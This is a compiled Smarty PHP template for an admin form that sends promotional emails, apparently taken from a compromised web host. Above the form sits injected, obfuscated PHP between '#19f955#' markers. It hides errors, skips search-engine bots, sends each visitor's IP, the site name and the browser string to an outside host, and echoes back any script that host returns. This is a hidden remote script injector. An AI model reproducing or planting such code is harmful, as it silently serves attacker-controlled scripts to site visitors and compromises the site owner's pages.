<?php /* Smarty version 2.6.22, created on 2010-08-11 15:26:43
         compiled from /home/a1425978/public_html//templates/send_promotional_email.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php echo $this->_tpl_vars['message']; ?>

<form action = 'admin.php' method="POST">
	<p>
		Email Subject<br />
		<input type="text" name="subject" class="textField" size='30' />
	</p>
	
	<p>
		Email Content<br />
		<textarea cols='85' rows='25' class='textField' name='content'></textarea>
	</p>
	
	<p>
		<input type="checkbox" name="test" value="true" /> Send Only A Test Email
	</p>
	
	<input type="submit" value="Send Email" class="buttonSubmit" />
</form>